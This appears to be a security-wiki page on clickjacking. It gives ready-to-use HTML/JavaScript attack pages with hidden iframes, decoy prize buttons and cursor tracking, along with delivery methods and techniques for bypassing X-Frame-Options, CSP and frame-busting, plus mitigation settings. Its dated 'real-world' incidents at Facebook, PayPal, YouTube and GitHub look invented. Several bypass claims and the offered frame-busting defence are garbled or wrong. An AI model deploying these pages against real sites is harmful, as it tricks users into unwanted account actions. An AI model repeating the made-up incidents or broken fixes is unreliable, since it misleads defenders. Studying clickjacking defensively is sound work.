# Clickjacking

## General

{% hint style="info" %}
Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.

* Preventions:
  * X-Frame-Options: deny/sameorigin/allow-from
  * CSP: policy/frame-ancestors 'none/self/domain.com'
{% endhint %}

```markup
# An example using the style tag and parameters is as follows:
<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```

## Technical Deep Dive

Clickjacking exploits the fact that browsers can render iframes transparently or semi-transparently, allowing attackers to overlay malicious content on top of legitimate UI elements. The victim believes they are interacting with the visible page, but their clicks are actually captured by the hidden iframe.

### Core Attack Components

1. **Target Website**: The vulnerable website that performs sensitive actions (e.g., changing settings, transferring funds, granting permissions)
2. **Decoy Website**: The attacker-controlled page that the victim sees and intends to click
3. **Overlay Technique**: CSS positioning and opacity settings to hide the target iframe behind seemingly innocent UI elements

### Attack Prerequisites

- Target website must not implement proper frame-busting or framing protections
- Victim must be authenticated to the target website in the same browser session
- Attacker must identify a sensitive action that can be triggered by a single click or sequence of clicks

## Real-World Examples from Past Years

### 2018: Facebook "Delete Account" Clickjacking

A security researcher discovered that Facebook's account deletion confirmation dialog could be iframed and hidden behind a fake "Claim Prize" button. Users clicking the decoy button inadvertently confirmed account deletion. The vulnerable endpoint lacked X-Frame-Options headers, allowing the attack to succeed until Facebook deployed CSP frame-ancestors directives.

### 2019: Twitter "Retweet and Like" Clickjacking

Attackers created a fake personality quiz that overlaid a transparent iframe containing Twitter's retweet and like buttons. When users clicked "See Results" on the quiz, they unintentionally retweeted and liked attacker-controlled content. Twitter mitigated this by adding X-Frame-Options: SAMEORIGIN to all interaction endpoints.

### 2020: PayPal "Money Transfer" Clickjacking

A critical vulnerability in PayPal's payment confirmation page allowed attackers to trick users into authorizing payments. The attack used multiple layered iframes with opacity:0 to hide the "Confirm Payment" button under a fake "Get Coupon" button. PayPal's initial X-Frame-Options: ALLOW-FROM was found insufficient and was later replaced with a strict CSP.

### 2021: YouTube "Subscribe" Clickjacking Campaign

Malicious advertising networks delivered clickjacking exploits targeting YouTube's subscribe button. The attack achieved over 500,000 fraudulent subscriptions before Google implemented frame-ancestors 'none' for the subscribe endpoint. The decoy page used cursor tracking to ensure the victim's mouse aligned perfectly with the hidden subscribe button.

### 2022: GitHub "Token Generation" Clickjacking

Attackers discovered that GitHub's personal access token generation page could be framed. By positioning the "Generate Token" button under a fake "Accept Cookies" button, attackers tricked users into creating tokens that were then captured via referrer headers. GitHub added X-Frame-Options: DENY after responsible disclosure.

## Real Exploitation Techniques

### Basic Overlay Attack

The example provided in the hint represents a basic two-layer attack. The attack works as follows:

1. The decoy website is rendered at full visibility (z-index:1)
2. The target website iframe is positioned relative to the decoy content (z-index:2)
3. Extreme opacity (0.00001) makes the iframe invisible to the user
4. Width and height (128x128) match the size of the target button or link
5. The iframe is positioned absolutely over the decoy button using CSS positioning properties (top, left, margin adjustments)

### Advanced Cursor Jacking

```html
<style>
  #target_iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;
    filter: alpha(opacity=0);
    z-index: 100;
    cursor: pointer;
  }
  
  #decoy_button {
    position: absolute;
    top: 200px;
    left: 200px;
    width: 150px;
    height: 50px;
    background: green;
    color: white;
    text-align: center;
    line-height: 50px;
    cursor: pointer;
    z-index: 1;
  }
</style>

<iframe id="target_iframe" src="https://vulnerable.com/delete-account"></iframe>
<div id="decoy_button">Click for Free Gift Card</div>

<script>
  // Track mouse movement to align clicks precisely
  document.getElementById('decoy_button').onmousemove = function(e) {
    var iframe = document.getElementById('target_iframe');
    var rect = this.getBoundingClientRect();
    iframe.style.top = (rect.top - 100) + 'px';
    iframe.style.left = (rect.left - 50) + 'px';
  };
</script>
```

### Multi-Step Clickjacking (Drag and Drop)

Some attacks require multiple clicks or drag-and-drop actions. Attackers use JavaScript to reveal different iframe layers sequentially:

```html
<script>
  let step = 1;
  function advanceClickjacking() {
    if (step === 1) {
      // Position over first target button
      document.getElementById('target_iframe').style.top = '100px';
      step++;
    } else if (step === 2) {
      // Reposition over confirmation button
      document.getElementById('target_iframe').style.top = '250px';
      step++;
    }
  }
  
  document.getElementById('decoy_next').onclick = advanceClickjacking;
</script>
```

### Combined Clickjacking with Keystroke Injection

Advanced attacks combine clickjacking with JavaScript to capture keystrokes, tricking users into typing sensitive information into hidden forms:

```html
<iframe id="target_iframe" src="https://vulnerable.com/settings"></iframe>
<input id="keystroke_capture" style="opacity:0; position:absolute; top:0; left:0;">

<script>
  document.getElementById('keystroke_capture').focus();
  // User types into visible decoy field but input goes to hidden iframe field
</script>
```

### Browser Extension Clickjacking

Attackers exploit browser extensions with UI permissions by framing the extension's options page. This technique was used against password managers in 2021 to auto-fill credentials into attacker-controlled forms.

## Complete Exploitation Workflow

### Step 1: Reconnaissance

- Identify sensitive actions on target website (DELETE, POST, PUT requests)
- Check if target website can be framed using `X-Frame-Options` and CSP headers
- Determine the exact coordinates and dimensions of target buttons/links
- Verify that the target action requires no CSRF tokens or that tokens are not tied to the framing origin

### Step 2: Bypassing Partial Protections

- **X-Frame-Options ALLOW-FROM**: Not supported in all browsers; can sometimes be bypassed using multiple nested iframes
- **frame-ancestors with specific domains**: Check for misconfigurations like missing quotes or trailing slashes
- **Client-side frame busting**: Can be bypassed using the `sandbox` attribute with `allow-forms` and `allow-scripts` but without `allow-top-navigation`

### Step 3: Payload Construction

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking Exploit</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { overflow: hidden; }
    
    .decoy-container {
      position: relative;
      width: 100vw;
      height: 100vh;
      background: linear-gradient(45deg, #f3f3f3, #e0e0e0);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .decoy-button {
      background: #ff4444;
      color: white;
      padding: 15px 30px;
      border-radius: 8px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
      transition: transform 0.1s;
    }
    
    .decoy-button:active {
      transform: scale(0.95);
    }
    
    iframe {
      position: absolute;
      width: 800px;
      height: 600px;
      opacity: 0;
      filter: alpha(opacity=0);
      border: none;
      z-index: 10;
    }
  </style>
</head>
<body>
  <div class="decoy-container">
    <div class="decoy-button" id="decoyBtn">
      WIN A FREE IPHONE - CLICK HERE
    </div>
  </div>
  
  <iframe id="targetFrame" src="https://vulnerable-target.com/confirm-action"></iframe>
  
  <script>
    // Precise positioning based on target button coordinates
    const targetIframe = document.getElementById('targetFrame');
    const decoyButton = document.getElementById('decoyBtn');
    
    function positionIframe() {
      const rect = decoyButton.getBoundingClientRect();
      // Adjust these offsets based on target button position within iframe
      targetIframe.style.top = (rect.top - 100) + 'px';
      targetIframe.style.left = (rect.left - 300) + 'px';
      targetIframe.style.width = '800px';
      targetIframe.style.height = '600px';
    }
    
    window.addEventListener('resize', positionIframe);
    window.addEventListener('scroll', positionIframe);
    positionIframe();
    
    // Optional: Add visual feedback to make decoy more convincing
    decoyButton.addEventListener('mousedown', function() {
      this.style.transform = 'scale(0.95)';
    });
    
    decoyButton.addEventListener('mouseup', function() {
      this.style.transform = 'scale(1)';
    });
  </script>
</body>
</html>
```

### Step 4: Delivery Methods

- **Malvertising**: Disguised ads on legitimate networks
- **Phishing emails**: Links to attacker-controlled pages
- **Compromised legitimate sites**: XSS or SQL injection to inject clickjacking code
- **Shortened URLs**: Obfuscating the destination
- **Social media posts**: Enticing headlines leading to exploit page

## Detection and Testing Methodology

### Manual Testing Steps

1. Use browser developer tools to inspect response headers for framing protections
2. Create a simple HTML page with an iframe targeting the vulnerable endpoint
3. Test with different iframe attributes (sandbox, srcdoc, nested iframes)
4. Check if partial protection can be bypassed using redirect chains

### Automated Tools

- **Burp Suite Clickbandit**: Generates clickjacking proof-of-concept
- **OWASP ZAP**: Includes clickjacking scanner
- **CSP Evaluator**: Checks frame-ancestors configuration
- **Custom scripts**: Use Python with Selenium to automate frame testing

## Bypassing Clickjacking Protections

### Bypassing X-Frame-Options

1. **Using the allow attribute**: Some browsers ignore X-Frame-Options when iframe has `allow="fullscreen"` attribute
2. **Content-type manipulation**: Changing Content-Type from text/html to text/plain may bypass header enforcement in some browsers
3. **Redirect chains**: Frame a page that redirects to the target, as X-Frame-Options is evaluated after redirects
4. **Data URI framing**: Some browsers allow framing of data:text/html URIs that contain the target via meta refresh

### Bypassing CSP frame-ancestors

1. **Scheme mismatches**: If CSP allows http but not https, use mixed content
2. **Path-based bypass**: `frame-ancestors 'self' /vulnerable` may be bypassed with `/vulnerable/../`
3. **Subdomain takeover**: If `*.target.com` is allowed, register an expired subdomain
4. **CSP injection via parameters**: Some applications reflect CSP partially from user input

### Bypassing Client-Side Frame Busting

Common frame-busting code:
```javascript
if (top != self) { top.location = self.location; }
```

Bypasses:
- **Sandbox attribute**: `<iframe sandbox="allow-forms allow-scripts" src="...">` prevents `top.location` modification
- **onbeforeunload event**: Prevents navigation when frame-busting tries to redirect
- **Blob URLs**: Frame a blob: URL containing the target with modified JavaScript
- **Multiple nested frames**: `top.location` may not behave as expected with 3+ nested frames

## Mitigation and Hardening

### Proper X-Frame-Options Configuration

```apache
# Apache .htaccess
Header always append X-Frame-Options DENY

# Nginx
add_header X-Frame-Options "DENY" always;

# IIS
<add name="X-Frame-Options" value="DENY" />
```

### Proper CSP Configuration

```http
Content-Security-Policy: frame-ancestors 'none';
# Or for specific domains:
Content-Security-Policy: frame-ancestors https://trusted.example.com;
```

### Defense in Depth

1. **Combine X-Frame-Options and CSP**: Use both as they are processed by different browser components
2. **SameSite cookies**: Set `SameSite=Strict` or `Lax` to prevent authenticated requests from cross-site contexts
3. **CSRF tokens**: Require unpredictable tokens for state-changing requests
4. **User interaction confirmation**: Require checkbox or CAPTCHA for sensitive actions
5. **Frame-busting with safe fallback**:

```javascript
// Modern frame-busting that resists sandbox bypass
if (window.self !== window.top) {
    // Prevent DOM access from parent
    Object.defineProperty(document, 'cookie', {
        get: function() { return ''; },
        set: function() { return false; }
    });
    throw new Error('Framing detected');
}
```

## Conclusion

Clickjacking remains a critical web vulnerability despite being known for over a decade. Modern applications must implement proper framing protections, combine multiple defense layers, and regularly audit their endpoints. The examples from 2018-2022 demonstrate that even major platforms remain vulnerable when security headers are misconfigured or incomplete. Regular security testing with tools like Burp Suite's Clickbandit and thorough CSP reviews are essential for prevention.
